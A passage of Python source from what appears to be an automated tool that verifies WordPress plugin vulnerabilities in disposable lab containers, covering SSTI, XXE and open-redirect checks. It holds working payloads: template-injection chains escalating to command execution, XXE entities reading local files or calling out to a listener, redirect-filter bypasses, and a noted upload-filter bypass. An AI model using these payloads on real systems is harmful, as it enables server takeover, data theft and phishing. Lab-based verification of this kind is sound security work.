                            sample_resp.headers.get("content-security-policy") or "")
                    if _csp:
                        res.evidence["csp_header"] = _csp
                        # note common weaknesses for the report
                        _csp_issues = []
                        if "'unsafe-inline'" in _csp:
                            _csp_issues.append("unsafe-inline present — inline scripts allowed")
                        if "'unsafe-eval'" in _csp:
                            _csp_issues.append("unsafe-eval present — eval() allowed")
                        if "script-src *" in _csp or "default-src *" in _csp:
                            _csp_issues.append("wildcard script-src — any origin allowed")
                        if not _csp_issues:
                            _csp_issues.append("CSP present — may limit exploitability")
                        res.evidence["csp_analysis"] = _csp_issues
                except Exception:
                    pass
        res.evidence["screenshots"] = boot.shots
        res.evidence["http_captures"] = boot.http_captures
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


def verify_wordpress_ssti(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, ssti_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    companion_plugins: Optional[list] = None,
    extra_nonce_pages: Optional[list] = None,
    extra_setup_trigger_paths: Optional[list] = None,
    shortcode_name: Optional[str] = None,
    keep_lab_on_failure: bool = False,
    ssti_engine_hint: str = "",
) -> WpVerifyResult:
    """Verifica server-side template injection con la misma idea que command injection: el payload
    pide al motor de plantillas que CALCULE un producto de dos numeros aleatorios (sintaxis de
    varios motores -- Jinja2/Twig {{ }}, ERB <%= %>, Velocity/Smarty ${ }, Ruby #{ }); si el
    producto (que no aparece en ningun punto del payload enviado) sale en la respuesta, es prueba
    de que el motor de plantillas EVALUO codigo, no que lo reflejo como texto."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    ssti_param = ssti_param_hint or _pick_param(parameters, _XSS_HINTS)
    if not ssti_param:
        res.detail = "no se identifico el parametro que llega al motor de plantillas"
        res.limitations.append("la verificacion de SSTI necesita saber que parametro llega a la "
                               "plantilla; afina 'parameters' en la hipotesis del LLM o pasalo a "
                               "mano (ssti_param_hint)")
        return res

    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins,
                              extra_setup_trigger_paths=extra_setup_trigger_paths,
                              shortcode_name=shortcode_name)
        if boot is None:
            return res

        a, b = secrets.randbelow(90) + 10, secrets.randbelow(90) + 10
        expected = a * b
        mul = f"{a}*{b}"
        # Build attempts list — if engine hint known, put its syntax first
        _engine_norm = (ssti_engine_hint or "").lower().strip()
        _engine_first: list[str] = []
        if _engine_norm in ("twig", "jinja2", "nunjucks"):
            _engine_first = [f"{{{{{mul}}}}}"]
        elif _engine_norm in ("smarty", "velocity", "freemarker"):
            _engine_first = [f"${{{mul}}}", f"${{T(java.lang.Math).sqrt({a*a})}}"]
        elif _engine_norm in ("erb", "ruby"):
            _engine_first = [f"<%= {mul} %>", f"#{{  {mul}  }}"]
        elif _engine_norm in ("blade",):
            _engine_first = [f"{{{{ {mul} }}}}"]
        elif _engine_norm in ("handlebars", "mustache", "pug"):
            _engine_first = [f"{{{{{mul}}}}}"]
        attempts = _engine_first + [
            # sintaxis directa de cada motor (Jinja2/Twig, Smarty/Velocity-like, Ruby/Slim, ERB,
            # Pebble, Freemarker/single-brace)
            f"{{{{{mul}}}}}", f"${{{mul}}}", f"#{{{mul}}}", f"<%= {mul} %>",
            f"{{{mul}}}", f"${{{{{mul}}}}}", f"<#if true>${{{mul}}}</#if>",
            # rotura de contexto cuando el valor cae DENTRO de otra expresion de plantilla ya
            # existente (p.ej. {{ "hola " + valor }}) -- hay que cerrar esa expresion primero
            f"}}{{{mul}}}{{", f"'}}{{{mul}}}{{'", f'"}}{{{mul}}}{{"',
            f"-}}{{{mul}}}{{-",          # control de espacios en blanco de Jinja2 ({%- -%})
            # rotura de atributo HTML antes de la plantilla (si el valor se inserta en
            # value="..."  dentro de una plantilla que luego evalua su propio contenido)
            f"\">{{{{{mul}}}}}<\"",
        ]
        # ademas de las anteriores (sintaxis elegida a mano), TODAS las plantillas aritmeticas
        # generalizables de ssti.fuzz en PayloadsAllTheThings -- cada una trae su propio resultado
        # esperado (la mayoria son a*b, pero @() de ASP classic usa a+b, sintaxis distinta).
        from .payload_kb import load_ssti_arithmetic_payloads
        attempt_pairs = [(p, expected) for p in attempts] + load_ssti_arithmetic_payloads(a, b)

        m = (http_method or "GET").upper()
        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        endpoint, base_params = _auto_resolve_wp_blockers(
            boot, lab, slug, m, endpoint, base_params, ssti_param, res, step,
            extra_nonce_pages=extra_nonce_pages)

        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "ssti_param": ssti_param, "a": a, "b": b, "producto_esperado": expected,
            "metodo": m, "endpoint": endpoint,
        })

        found = False
        tried = []
        for payload_value, payload_expected in attempt_pairs:
            pattern = re.compile(rf"(?<!\d){payload_expected}(?!\d)")
            payload = dict(base_params)
            payload[ssti_param] = payload_value
            step(f"probando {m} {endpoint} con {ssti_param}={payload_value!r}...")
            try:
                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                                   data=payload if m != "GET" else None,
                                   params=payload if m == "GET" else None, timeout=20)
            except Exception as e:
                tried.append({"payload": payload_value, "error": str(e)})
                continue
            matched = bool(pattern.search(resp.text or ""))
            tried.append({"payload": payload_value, "status": resp.status_code,
                         "producto_presente": matched})
            if matched:
                found = True
                res.evidence["payload_ganador"] = payload_value
                res.evidence["resultado_esperado_ganador"] = payload_expected
                res.evidence["status_code_respuesta"] = resp.status_code
                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                step(f"VERIFICADO: la respuesta contiene {payload_expected}, calculado por el "
                     f"motor de plantillas -- ese numero no aparece en el payload enviado.")
                step("capturando pantalla: la respuesta HTTP con el producto calculado por el "
                     "motor de plantillas (prueba final)...")
                # Captura HTTP (GET y POST)
                _capture_exploit_shot(
                    boot, m, endpoint, resp, highlight=str(payload_expected),
                    caption_es=(f"Paso 5 (CLAVE): SSTI CONFIRMADA — la respuesta contiene "
                                f"{payload_expected} (={payload_expected}), calculado por el "
                                f"motor de plantillas. Payload: {ssti_param}={payload_value!r}"),
                    caption_en=(f"Step 5 (KEY): SSTI CONFIRMED — response contains "
                                f"{payload_expected}, computed by the template engine. "
                                f"Payload: {ssti_param}={payload_value!r}"))
                # Para GET también captura con el navegador
                if m == "GET":
                    shot_url = (boot.base_url + endpoint
                               + ("&" if "?" in endpoint else "?")
                               + f"{ssti_param}={payload_value}")
                    boot.capture(boot.sub_sess, shot_url[len(boot.base_url):],
                           f"Paso 5b: SSTI (navegador) — resultado {payload_expected} visible.",
                           f"Step 5b: SSTI (browser) — result {payload_expected} visible.")
                # --- Post-SSTI RCE escalation via engine-specific payloads ---
                try:
                    _win_payload = res.evidence["payload_ganador"]
                    # Detect template engine from winning payload syntax
                    _ssti_engine = "unknown"
                    if _win_payload.startswith("{{"):
                        _ssti_engine = "twig_or_jinja2"
                    elif _win_payload.startswith("${"):
                        _ssti_engine = "smarty_velocity"
                    elif _win_payload.startswith("<%="):
                        _ssti_engine = "erb"
                    elif _win_payload.startswith("#{"):
                        _ssti_engine = "ruby"
                    res.evidence["ssti_engine"] = _ssti_engine

                    # Engine-specific RCE candidates (token-based confirm)
                    _ssti_rce_token = _token()[:8]
                    _rce_candidates = []
                    if _ssti_engine == "twig_or_jinja2":
                        # Twig: filter-chain RCE
                        _rce_candidates = [
                            (f"{{{{['{_ssti_rce_token}']|map('system')|join}}}}",
                             _ssti_rce_token, "twig_map_system"),
                            # Jinja2: subprocess via __subclasses__
                            (f"{{{{'echo {_ssti_rce_token}'.__class__.__mro__[1]"
                             f".__subclasses__()[396]('echo {_ssti_rce_token}',shell=True,"
                             f"stdout=-1).communicate()[0].decode()}}}}",
                             _ssti_rce_token, "jinja2_subclasses"),
                            # Twig: _self chain
                            (f"{{{{_self.env.registerUndefinedFilterCallback(\"system\")}}}}{{{{_self.env.getFilter('echo {_ssti_rce_token}')}}}}",
                             _ssti_rce_token, "twig_self_env"),
                        ]
                    elif _ssti_engine == "smarty_velocity":
                        _rce_candidates = [
                            (f"{{php}}echo '{_ssti_rce_token}';{{/php}}", _ssti_rce_token, "smarty_php"),
                            (f"$class.inspect('java.lang.Runtime').type.getRuntime().exec('echo {_ssti_rce_token}')",
                             _ssti_rce_token, "velocity_runtime"),
                        ]
                    elif _ssti_engine == "erb":
                        _rce_candidates = [
                            (f"<%= `echo {_ssti_rce_token}` %>", _ssti_rce_token, "erb_backtick"),
                            (f"<%= system('echo {_ssti_rce_token}') %>", _ssti_rce_token, "erb_system"),
                        ]

                    for _rce_p, _rce_confirm, _rce_tech in _rce_candidates:
                        try:
                            _rce_params = dict(base_params)
                            _rce_params[ssti_param] = _rce_p
                            _rce_resp = boot.sub_sess.request(
                                m, boot.base_url + endpoint,
                                data=_rce_params if m != "GET" else None,
                                params=_rce_params if m == "GET" else None, timeout=15)
                            if _rce_confirm in (_rce_resp.text or ""):
                                res.evidence["ssti_rce"] = {
                                    "technique": _rce_tech,
                                    "payload": _rce_p[:200],
                                    "token_confirmed": _rce_confirm,
                                }
                                step(f"SSTI RCE CONFIRMADO via {_rce_tech} — token {_rce_confirm!r} en respuesta")
                                break
                        except Exception:
                            pass
                except Exception:
                    pass
                break
        res.evidence["intentos"] = tried
        if found:
            res.verified = True
            res.ok = True
            _rce_note = ""
            if res.evidence.get("ssti_rce"):
                _rce_note = (f" | RCE escalado via {res.evidence['ssti_rce']['technique']}")
            res.detail = (f"SSTI confirmada: la peticion con {ssti_param}="
                          f"{res.evidence['payload_ganador']!r} hizo que el motor de plantillas "
                          f"EVALUARA la expresion y devolviera {res.evidence['resultado_esperado_ganador']} "
                          f"en la respuesta -- prueba inequivoca de evaluacion de codigo en "
                          f"servidor (ese numero no esta en ningun punto del payload enviado)"
                          f"{_rce_note}")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} sintaxis de plantilla para {ssti_param} "
                          f"(producto esperado {a}*{b}={expected}, mas las plantillas aditivas) y "
                          f"ninguna produjo el resultado esperado en la respuesta -- el SSTI no "
                          f"se confirmo (puede necesitar otra sintaxis de motor, o el "
                          f"endpoint/parametro no son los reales)")
        res.evidence["screenshots"] = boot.shots
        res.evidence["http_captures"] = boot.http_captures
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


def verify_wordpress_xxe(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, xml_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    companion_plugins: Optional[list] = None,
    extra_nonce_pages: Optional[list] = None,
    extra_setup_trigger_paths: Optional[list] = None,
    shortcode_name: Optional[str] = None,
    keep_lab_on_failure: bool = False,
) -> WpVerifyResult:
    """Verifica XML External Entity con el mismo patron de fichero canario que path-traversal/LFI
    (ver verify_wordpress_path_traversal): planta un secreto aleatorio en una ruta del sistema de
    ficheros REAL del contenedor, construye una DTD externa que apunta a esa ruta con file://, y
    confirma que el secreto EXACTO aparece en la respuesta tras mandar el XML -- no una deduccion
    por status code o tiempo de respuesta. Prueba tanto mandar la DTD como VALOR de un parametro
    de formulario (si la hipotesis cita uno) como mandarla como CUERPO crudo de la peticion
    (application/xml y text/xml), que es el caso mas comun en APIs REST."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    xml_param = xml_param_hint or _pick_param(parameters, _XML_HINTS)

    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins,
                              extra_setup_trigger_paths=extra_setup_trigger_paths,
                              shortcode_name=shortcode_name)
        if boot is None:
            return res

        secret = secrets.token_hex(16)
        canary_path = f"/tmp/binoracle_canary_{_token()}.txt"
        step(f"plantando fichero canario con un secreto aleatorio en {canary_path}...")
        if not boot.lab.write_canary(canary_path, secret):
            res.detail = f"no se pudo plantar el fichero canario en {canary_path}"
            return res

        xxe_xml = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                  f'"file://{canary_path}">]><foo>&xxe;</foo>')
        m = (http_method or "GET").upper()
        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        endpoint, base_params = _auto_resolve_wp_blockers(
            boot, lab, slug, m, endpoint, base_params, xml_param, res, step,
            extra_nonce_pages=extra_nonce_pages)
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "xml_param": xml_param or "(cuerpo crudo)", "canary_path": canary_path,
            "canary_secret": secret, "metodo": m, "endpoint": endpoint,
        })

        tried = []
        found = False

        def try_send(label, **kwargs):
            nonlocal found
            step(f"probando {m} {endpoint} ({label})...")
            try:
                resp = boot.sub_sess.request(m, boot.base_url + endpoint, timeout=20, **kwargs)
            except Exception as e:
                tried.append({"modo": label, "error": str(e)})
                return
            present = secret in (resp.text or "")
            followed_resp, follow_url = resp, None
            if not present:
                for candidate in _extract_followable_urls(resp.text, boot.base_url):
                    try:
                        candidate_resp = boot.sub_sess.request("GET", candidate, timeout=20)
                    except Exception:
                        continue
                    if secret in (candidate_resp.text or ""):
                        followed_resp, follow_url, present = candidate_resp, candidate, True
                        break
            tried.append({"modo": label, "status": resp.status_code, "secreto_presente": present,
                         **({"followed_url": follow_url} if follow_url else {})})
            if present and not found:
                found = True
                res.evidence["modo_ganador"] = label
                if follow_url:
                    res.evidence["url_seguida"] = follow_url
                res.evidence["status_code_respuesta"] = followed_resp.status_code
                res.evidence["respuesta_cuerpo_recorte"] = (followed_resp.text or "")[:500]
                step((f"VERIFICADO: el secreto plantado aparecio literal en la respuesta de "
                     f"{follow_url} ({label}, la peticion copio el fichero ahi en vez de "
                     f"devolver el contenido directo)" if follow_url else
                     f"VERIFICADO: el secreto plantado aparecio literal en la respuesta "
                     f"({label})."))

        # variantes del XML en si: la entidad DOCTYPE normal, parametro-entidad (algunos parsers
        # solo resuelven SYSTEM dentro de %param;, no en una entidad general directa), y envuelta
        # en SOAP (algunas APIs esperan un envelope, no XML plano)
        xxe_param_entity = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
                            f'"file://{canary_path}"> %xxe; ]><foo>test</foo>')
        xxe_soap = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                   f'"file://{canary_path}">]><soap:Envelope '
                   f'xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>'
                   f'<foo>&xxe;</foo></soap:Body></soap:Envelope>')
        xml_variants = [("entidad general (DOCTYPE normal)", xxe_xml),
                        ("parametro-entidad", xxe_param_entity),
                        ("envuelta en SOAP", xxe_soap)]

        for label, xml_body in xml_variants:
            if found:
                break
            if xml_param:
                payload = dict(base_params)
                payload[xml_param] = xml_body
                try_send(f"{label}, parametro de formulario",
                         data=payload if m != "GET" else None,
                         params=payload if m == "GET" else None)
            if not found:
                try_send(f"{label}, cuerpo crudo application/xml", data=xml_body.encode(),
                         headers={"Content-Type": "application/xml"})
            if not found:
                try_send(f"{label}, cuerpo crudo text/xml", data=xml_body.encode(),
                         headers={"Content-Type": "text/xml"})

        res.evidence["intentos"] = tried

        # fallback OOB/blind: si ninguna variante en banda devolvio el secreto en la respuesta
        # (p.ej. porque el resultado de la entidad nunca se refleja de vuelta), se referencia el
        # listener interno de SSRF (ver verify_wordpress_ssrf) como SYSTEM de la entidad -- si el
        # parser XML resuelve entidades externas DE VERDAD, intentara conectarse por HTTP a esa
        # URL, y la conexion queda grabada con un token unico. No extrae el secreto del fichero
        # (es una prueba mas debil que la del canario en banda), pero confirma que el parser
        # resuelve entidades externas arbitrarias -- suficiente para XXE ciego/OOB.
        oob_hit = None
        if not found:
            step("ninguna variante en banda devolvio el secreto; probando XXE ciego/OOB via el "
                 "listener interno...")
            listener = lab.start_listener()
            if listener:
                oob_token = _token()
                oob_xml = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                          f'"http://{lab.listener}:8080/binoracle-xxe-oob-{oob_token}">]>'
                          f'<foo>&xxe;</foo>')
                payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                if xml_param:
                    payload[xml_param] = oob_xml
                    try:
                        boot.sub_sess.request(m, boot.base_url + endpoint,
                                   data=payload if m != "GET" else None,
                                   params=payload if m == "GET" else None, timeout=20)
                    except Exception:
                        pass
                else:
                    try:
                        boot.sub_sess.request(m, boot.base_url + endpoint, data=oob_xml.encode(),
                                   headers={"Content-Type": "application/xml"}, timeout=20)
                    except Exception:
                        pass
                time.sleep(2)
                oob_log = lab.listener_log()
                oob_hit = oob_token in oob_log
                res.evidence["oob_intento"] = {"token": oob_token, "hit": oob_hit}
                if oob_hit:
                    found = True
                    res.evidence["tecnica"] = "oob-blind"
                    res.evidence["modo_ganador"] = "OOB via listener interno"

        if found:
            res.verified = True
            res.ok = True
            if res.evidence.get("tecnica") == "oob-blind":
                res.detail = ("XXE ciego/OOB confirmado: el parser XML intento resolver una "
                              "entidad externa apuntando a un listener interno (inalcanzable "
                              "desde fuera del laboratorio), y la conexion llego con el token "
                              "exacto -- prueba de que el parser resuelve entidades externas "
                              "arbitrarias, aunque no se extrajo el contenido del fichero (mas "
                              "debil que la prueba en banda con el canario)")
                _capture_terminal_shot(
                    boot, "binoracle · XXE OOB evidence — listener log",
                    content=(f"[XXE OOB CONFIRMED]\nXML parser resolved external entity to internal listener.\n\n"
                             f"Listener log:\n{res.evidence.get('listener_log_recorte','')}"),
                    highlight=res.evidence.get("token_ganador", ""),
                    caption_es="Paso 5 (CLAVE): XXE OOB CONFIRMADO — log del listener con conexion del parser XML.",
                    caption_en="Step 5 (KEY): XXE OOB CONFIRMED — listener log shows XML parser made external request.",
                    url=boot.base_url + endpoint)
            else:
                res.detail = (f"XXE confirmada ({res.evidence['modo_ganador']}): la respuesta "
                              f"contiene el secreto exacto plantado en {canary_path} -- el "
                              f"parser XML resolvio una entidad externa apuntando al sistema de "
                              f"ficheros real")
                # Screenshot HTTP con el secreto en la respuesta
                _xxe_body = res.evidence.get("respuesta_cuerpo_recorte", "")
                if _xxe_body:
                    _capture_exploit_shot(
                        boot, m, endpoint, _xxe_body, highlight=secret,
                        caption_es=(f"Paso 5 (CLAVE): XXE CONFIRMADA — respuesta HTTP con el "
                                    f"secreto de {canary_path} incluido en la respuesta XML. "
                                    f"Modo: {res.evidence.get('modo_ganador','')}"),
                        caption_en=(f"Step 5 (KEY): XXE CONFIRMED — HTTP response with secret "
                                    f"from {canary_path} in XML response."))
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} formas de mandar la entidad externa (en "
                          f"banda) y el intento OOB via listener interno, y ninguna confirmo "
                          f"nada -- el XXE no se confirmo (puede que el parser tenga "
                          f"resolve_external_entities desactivado, o el endpoint/parametro no "
                          f"son los reales)")
        res.evidence["screenshots"] = boot.shots
        res.evidence["http_captures"] = boot.http_captures
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


def verify_wordpress_open_redirect(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, redirect_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    companion_plugins: Optional[list] = None,
    extra_nonce_pages: Optional[list] = None,
    extra_setup_trigger_paths: Optional[list] = None,
    shortcode_name: Optional[str] = None,
    keep_lab_on_failure: bool = False,
) -> WpVerifyResult:
    """Verifica open redirect mandando como valor del parametro una URL EXTERNA completa, con
    redirects deshabilitados en el cliente (allow_redirects=False) para inspeccionar la cabecera
    Location real sin seguirla. Se marca verificado SOLO si la respuesta es un 3xx y la cabecera
    Location coincide EXACTA (o empieza exactamente) con la URL externa que mandamos -- no una
    deduccion por el codigo de estado solo, que tambien aparece en redirecciones legitimas."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    redirect_param = redirect_param_hint or _pick_param(parameters, _REDIRECT_HINTS)
    if not redirect_param:
        res.detail = "no se identifico el parametro que lleva la URL de destino"
        res.limitations.append("la verificacion de open redirect necesita saber que parametro "
                               "lleva la URL de destino; afina 'parameters' en la hipotesis del "
                               "LLM o pasalo a mano (redirect_param_hint)")
        return res

    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins,
                              extra_setup_trigger_paths=extra_setup_trigger_paths,
                              shortcode_name=shortcode_name)
        if boot is None:
            return res

        token = _token()
        evil_host = f"binoracle-lab-redirect-{token}.invalid"
        # variantes de bypass: cada una ataca un tipo de filtro distinto -- una comprobacion con
        # startswith('http') se salta con protocol-relative, una que solo mira el host tras el
        # esquema se confunde con el truco de userinfo (@), un parser laxo acepta backslash donde
        # el navegador tambien lo acepta, y un filtro de substring ingenuo cae con espacios/tabs.
        targets = [
            f"https://{evil_host}/pwned",                              # URL externa directa
            f"//{evil_host}/pwned",                                    # protocol-relative
            f"https:/\\{evil_host}/pwned",                             # backslash parcial
            f"https:\\\\{evil_host}\\pwned",                           # backslash total
            f"https://trusted.example.com@{evil_host}/pwned",          # userinfo (host confiable antes de @)
            f"https://{evil_host}\\@trusted.example.com/pwned",        # userinfo invertido con backslash
            f" https://{evil_host}/pwned",                             # espacio inicial
            f"\thttps://{evil_host}/pwned",                            # tab inicial
            f"https://{evil_host}#@trusted.example.com/",              # truco de fragmento
            f"https://trusted.example.com.{evil_host}/pwned",          # subdominio del host confiable
            f"///{evil_host}/pwned",                                   # triple slash (algunos parsers lo siguen tratando como protocol-relative)
            f"////{evil_host}/pwned",                                  # cuadruple slash
            f"/https://{evil_host}/pwned",                             # slash inicial delante de URL absoluta (burla un check 'startswith(/)')
        ]
        from .payload_kb import load_open_redirect_templates
        targets += load_open_redirect_templates(evil_host)
        m = (http_method or "GET").upper()
        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        endpoint, base_params = _auto_resolve_wp_blockers(
            boot, lab, slug, m, endpoint, base_params, redirect_param, res, step,
            extra_nonce_pages=extra_nonce_pages)
        tried = []
        confirmed_entry = None
        for target in targets:
            payload = dict(base_params)
            payload[redirect_param] = target
            step(f"probando {m} {endpoint} con {redirect_param}={target!r} (sin seguir redirects)...")
            try:
                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
                                   data=payload if m != "GET" else None,
                                   params=payload if m == "GET" else None, timeout=20,
                                   allow_redirects=False)
            except Exception as e:
                tried.append({"target": target, "error": str(e)})
                continue
            location = resp.headers.get("Location", "")
            is_redirect = resp.status_code in (301, 302, 303, 307, 308)
            confirmed = is_redirect and _redirect_location_is_external(location, evil_host)
            tried.append({"target": target, "status": resp.status_code, "location": location,
                         "confirmado": confirmed})
            if confirmed:
                confirmed_entry = tried[-1]
                break
        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "redirect_param": redirect_param, "dominio_externo_esperado": evil_host,
            "metodo": m, "endpoint": endpoint, "intentos": tried,
        })

        if confirmed_entry:
            res.verified = True
            res.ok = True
            res.evidence["status_code_respuesta"] = confirmed_entry["status"]
            res.evidence["location_recibida"] = confirmed_entry["location"]
            res.evidence["url_externa_ganadora"] = confirmed_entry["target"]
            res.detail = (f"OPEN REDIRECT confirmado: la peticion con {redirect_param}="
                          f"{confirmed_entry['target']!r} produjo un {confirmed_entry['status']} "
                          f"con Location={confirmed_entry['location']!r} -- el servidor redirige "
                          f"de verdad a un dominio externo controlado por el atacante")
            step(f"VERIFICADO: Location={confirmed_entry['location']!r} contiene el dominio "
                 f"externo enviado.")
            # Screenshot de la respuesta con la cabecera Location resaltada
            _redir_body = (f"HTTP {confirmed_entry['status']}\r\n"
                           f"Location: {confirmed_entry['location']}\r\n"
                           f"\r\n(redirect to attacker-controlled domain)")
            _capture_exploit_shot(
                boot, m, endpoint, _redir_body,
                highlight=confirmed_entry["location"],
                caption_es=(f"Paso 5 (CLAVE): OPEN REDIRECT CONFIRMADO — respuesta "
                            f"HTTP {confirmed_entry['status']} con Location: "
                            f"{confirmed_entry['location']!r} apuntando al dominio externo. "
                            f"Payload: {redirect_param}={confirmed_entry['target']!r}"),
                caption_en=(f"Step 5 (KEY): OPEN REDIRECT CONFIRMED — HTTP {confirmed_entry['status']} "
                            f"with Location: {confirmed_entry['location']!r} pointing to "
                            f"attacker-controlled domain."))
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} variantes de bypass (directa, "
                          f"protocol-relative, backslash, userinfo, espacios/tabs, subdominio) "
                          f"para {redirect_param} y ninguna produjo un redirect con "
                          f"'{evil_host}' en Location -- el open redirect no se confirmo")
            if tried:
                first = tried[0]
                res.evidence["respuesta_cuerpo_recorte"] = (
                    f"status={first.get('status')} location={first.get('location')!r}")
        res.evidence["screenshots"] = boot.shots
        res.evidence["http_captures"] = boot.http_captures
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)


def _resolve_form_id_for_upload(boot, lab, slug: str, step) -> str:
    """Extrae el ID numerico de un formulario desde la pagina del shortcode o via wp-cli.

    Cubre plugins que almacenan sus formularios como custom post types (WordForm, WPForms,
    Gravity Forms, CF7, Ninja Forms...) y cuyo campo de subida incluye el ID como parte del
    nombre del campo (`wordform[{form_id}][upload][0][files]`).

    Estrategias en orden:
    1. Scrape de la pagina del shortcode: busca name="slug[NNN]..." en el HTML del formulario.
    2. wp-cli: lista el primer post del CPT del plugin.
    3. Crea un post del CPT via wp eval como último recurso y devuelve su ID."""
    # 1. Scrape shortcode page HTML for name="slug[NNN]..." pattern
    if getattr(boot, "shortcode_page_path", None):
        try:
            html = boot.sub_sess.get(boot.base_url + boot.shortcode_page_path, timeout=15).text
            m = re.search(rf'name="{re.escape(slug)}\[(\d+)\]', html or "")
            if m:
                step(f"form_id={m.group(1)} extraido del HTML de la pagina del shortcode")
                return m.group(1)
        except Exception:
            pass

    # 2. wp-cli: first post of the plugin's CPT (tries several naming conventions)
    _UPLOAD_PLUGIN_CPTS: dict = {
        "wordform": "wordform",
        "wpforms-lite": "wpforms", "wpforms": "wpforms",
        "gravityforms": "gf_form",
        "contact-form-7": "wpcf7_contact_form",
        "ninja-forms": "nf_form",
        "formidable": "frm_form",
        "caldera-forms": "cf2",
        "fluentform": "fluentform",
        "everest-forms": "everest_form",
    }
    cpt_candidates = list(dict.fromkeys([
        _UPLOAD_PLUGIN_CPTS.get(slug, ""),
        slug,
        f"{slug}_form",
        f"{slug.replace('-', '_')}_form",
    ]))
    for cpt in cpt_candidates:
        if not cpt:
            continue
        try:
            r = lab.wp_cli("post", "list", f"--post_type={cpt}",
                           "--format=ids", "--posts_per_page=1", timeout=10)
            ids = (r.stdout or "").strip().split()
            if ids and ids[0].isdigit():
                step(f"form_id={ids[0]} extraido via wp-cli (post_type={cpt})")
                return ids[0]
        except Exception:
            pass

    # 3. Create a minimal form post via wp eval and return its ID
    _cpt_create = _UPLOAD_PLUGIN_CPTS.get(slug, slug)
    try:
        r = lab.wp_cli("eval",
                       f"echo wp_insert_post(['post_type'=>'{_cpt_create}',"
                       f"'post_title'=>'binoracle test form','post_status'=>'publish']);",
                       timeout=10)
        fid = (r.stdout or "").strip()
        if fid.isdigit() and int(fid) > 0:
            step(f"form_id={fid} creado via wp eval (post_type={_cpt_create})")
            return fid
    except Exception:
        pass

    return ""


# CPTs conocidos de plugins de subida -- usados por _resolve_form_id_for_upload y por
# cve_agent.py para configurar shortcode_name y extra_upload_data automaticamente.
_UPLOAD_FORM_PLUGIN_CONFIG: dict = {
    # slug → {
    #   "file_field_tpl"    : nombre del campo del fichero (puede tener {form_id})
    #   "extra_upload_data" : datos POST adicionales (bypass, nombre, form ID, etc.)
    #   "nonce_param"       : clave del nonce en la peticion POST
    #   "nonce_action"      : accion real de wp_create_nonce() / check_ajax_referer()
    #   "ajax_action"       : valor del campo 'action' para wp-admin/admin-ajax.php
    #   "shortcode_name"    : nombre del shortcode para crear la pagina de prueba
    # }
    # nopriv=True → la accion es accesible sin autenticacion (wp_ajax_nopriv_*); el ataque
    # usara una sesion anonima en vez de boot.sub_sess, y el nonce se generara para uid=0.
    # El nonce de un usuario autenticado no valida para uid=0 y viceversa.
    "wordform": {
        # El campo real del form HTML es 'files[]' (array): name="wordform[ID][upload][KEY][files][]"
        # Con 'files[]', $_FILES crea un array → merge correcto → array_filter no falla en PHP 8.
        "file_field_tpl": "wordform[{form_id}][upload][0][files][]",
        "extra_upload_data": {
            # bypass: fileAllowed vacío → wp_check_filetype devuelve '' que está en la allowed_list ['']
            "wordform[{form_id}][upload][0][fileAllowed]": "",
            "WordFormID": "{form_id}",
        },
